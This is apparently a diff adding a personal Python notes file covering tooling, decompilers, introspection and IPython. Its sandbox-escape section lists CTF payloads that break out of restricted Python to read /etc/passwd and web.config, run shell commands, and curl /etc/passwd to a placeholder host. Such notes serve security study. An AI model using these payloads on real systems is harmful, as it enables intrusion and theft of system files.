@@ -1,0 +1,117 @@
+# python
+
+# pip
+pip install --user -r requirements.txt 
+PROTOCOL_SSLv3 error: easy_install --upgrade pip
+
+# virtualenv
+virtualenv .venv
+source .venv/bin/activate
+
+# deep
+http://sebastianraschka.com/Articles/2014_deep_python.html
+
+# decompile
+https://github.com/rocky/python-uncompyle6
+https://github.com/zrax/pycdc
+https://www.fireeye.com/blog/threat-research/2016/04/deobfuscating_python.html uncompyle2 or meta https://github.com/wibiti/uncompyle2 http://srossross.github.io/Meta/html/api/decompile.html
+https://github.com/alex/python-decompiler
+https://sourceforge.net/p/pyinstallerextractor/tickets/5/
+https://sourceforge.net/projects/easypythondecompiler/ used in http://security.szurek.pl/blazectf-2016-postboard-writeup.html
+
+# sandox escape / breaking out of restricted environments
+http://tomforb.es/breaking-out-of-secured-python-environments
+raise BaseException()
+enumerate attributes
+ - use the __dict__ attribute on any class (obvious to restrict)
+ - dir()
+print exit(dir(x)) if str is restricted, exit() turns its parameters into a string
+func_globals is a "reference to the dictionary that holds the function’s global variables — the global namespace of the module in which the function was defined"
+print solve.func_globals["sys"].modules
+for l in solve.func_globals["sys"].modules["io"].FileIO(r'path\to\web.config'): print l
+
+https://doar-e.github.io/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug/
+
+''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
+''.__class__.__mro__[2].__subclasses__()[59].__repr__.im_func.func_globals['__builtins__']['globals']()"
+''.__class__.__mro__[2].__subclasses__()[59].__enter__.__func__.__globals__['linecache'].checkcache.__globals__['os'].system('curl%20me%20-Ffoo%3d%40/etc/passwd') # bsidessf ctf 2017
+
+python3: bytes(str(__builtins__['__import__'] ('subprocess').check_output('cat'+chr(32)+'...',shell=True))+'\n','utf-8')
+
+# sanbox escape via memory corruption
+https://medium.com/@gabecpike/python-sandbox-escape-via-a-memory-corruption-bug-19dde4d5fea5
+https://conference.hitb.org/hitbsecconf2014ams/materials/D2T1-G-Jacking-AppEngine-based-Applications.pdf
+
+# cool links
+http://www.rafekettler.com/magicmethods.html
+http://www.e-booksdirectory.com/programming.php#python
+
+# dict
+>>> dict(sape=4139, guido=4127, jack=4098) # easier to specify pairs using keyword arguments
+{'sape': 4139, 'jack': 4098, 'guido': 4127}
+
+# module __builtin__
+str() # convertit l'objet en une string
+dir() # affiche les methodes de l'objet
+
+import types
+>>> type(odbchelper) == types.ModuleType
+True
+
+print "\n".join(["%s=%s" % (k, v)  for k, v in os.environ.items()])
+print '\n'.join(sys.modules.keys())
+
+# introspection
+getattr(li, "append")("Moe")
+callable(getattr(object, method))
+import statsout
+
+def output(data, format="text"):
+    output_function = getattr(statsout, "output_%s" % format, statsout.output_text)
+    return output_function(data)
+
+# and / or
+and: 'a' and 'b' and 'c' => 'c' # All values are true, so and returns the last value, 'c'.
+ or: If all values are false, or returns the last value.
+
+# os.path
+split, splitext, join, expanduser, isfile, isdir
+[f for f in os.listdir(dirname) if os.path.isfile(os.path.join(dirname, f))]
+files = [os.path.normcase(f) for f in os.listdir(directory)]
+files = [os.path.join(directory, f) for f in files if os.path.splitext(f)[1] in exts]
+
+glob.glob('c:\\music\\*\\*.mp3')
+
+# nested functions
+la fonction ne peut etre appelée que par la fonction dans laquelle elle est définie
+
+# re
+r'\bROAD\b' # raw string pas besoin de faire \\b (word boundary) et r'\t' s'interpret '\t' et non tab
+
+re.VERBOSE
+
+# ipython
+#http://pages.physics.cornell.edu/~myers/teaching/ComputationalMethods/python/ipython.html
+whos
+monobjet? ou ??
+%pdef, %psource, %pfile, %psearch
+
+%pdb    # debugger on stacktrace
+%run -d # br on first line mais bug pour l'instant
+%run -p
+
+var = Out[19] ou _19
+exec In[22:29]+In[34]
+
+var = !uname -a
+!echo $var
+
+%edit -p
+%edit _NN
+
+%store
+
+# threads and sigint/keyboardinterrupt
+http://code.activestate.com/recipes/496735-workaround-for-missed-sigint-in-multithreaded-prog/
+
+
